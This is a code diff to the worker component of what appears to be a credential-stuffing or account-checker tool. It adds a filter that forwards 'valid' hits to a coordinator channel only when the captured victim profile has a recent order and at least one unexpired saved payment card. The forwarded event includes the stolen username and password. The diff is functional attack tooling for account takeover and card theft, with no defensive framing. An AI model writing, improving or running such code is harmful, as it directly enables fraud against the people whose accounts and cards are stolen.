@@ -892,15 +892,61 @@ class WorkerNode {
   }
 
   /**
+   * Validate capture data against channel-forward guard requirements.
+   * Requirements: latestOrder !== 'n/a' and at least one unexpired card.
+   * @param {Object|null} capture
+   * @returns {{valid: boolean, reason: string}}
+   */
+  validateCaptureForForwarding(capture) {
+    if (!capture) {
+      return { valid: false, reason: 'no capture data' };
+    }
+
+    if (!capture.latestOrder || capture.latestOrder === 'n/a') {
+      return { valid: false, reason: 'no latest order' };
+    }
+
+    if (!capture.profile || !Array.isArray(capture.profile.cards) || capture.profile.cards.length === 0) {
+      return { valid: false, reason: 'no cards captured' };
+    }
+
+    const hasUnexpiredCard = capture.profile.cards.some((card) => {
+      if (!card || !card.expiry) return false;
+      const [mm, yy] = String(card.expiry).split(/[\/\-]/);
+      const month = Number(mm);
+      const year = yy ? Number(yy.length === 2 ? `20${yy}` : yy) : NaN;
+      if (!month || month < 1 || month > 12 || !year) return false;
+      const expiryDate = new Date(year, month, 0);
+      return expiryDate >= new Date();
+    });
+
+    if (!hasUnexpiredCard) {
+      return { valid: false, reason: 'all cards expired or missing expiry' };
+    }
+
+    return { valid: true, reason: '' };
+  }
+
+  /**
    * Publish result events to Redis pub/sub for coordinator
    * @param {Object} result - Result object
    * @param {Object} checkResult - Original check result
    */
   async publishResultEvents(result, checkResult) {
     try {
-      // If VALID, always publish forward_event so the channel gets every hit.
-      // Send capture when available; coordinator will still forward with a fallback message if capture is missing/invalid.
+      // Publish forward_event only when capture passes the forwarding guard.
       if (result.status === 'VALID') {
+        const validation = this.validateCaptureForForwarding(result.capture || null);
+        if (!validation.valid) {
+          log.debug('Skipping forward_event publish: capture does not meet forwarding guard', {
+            workerId: this.workerId,
+            username: result.username,
+            batchId: result.batchId,
+            reason: validation.reason
+          });
+          return;
+        }
+
         const forwardEvent = {
           username: result.username,
           password: result.password,
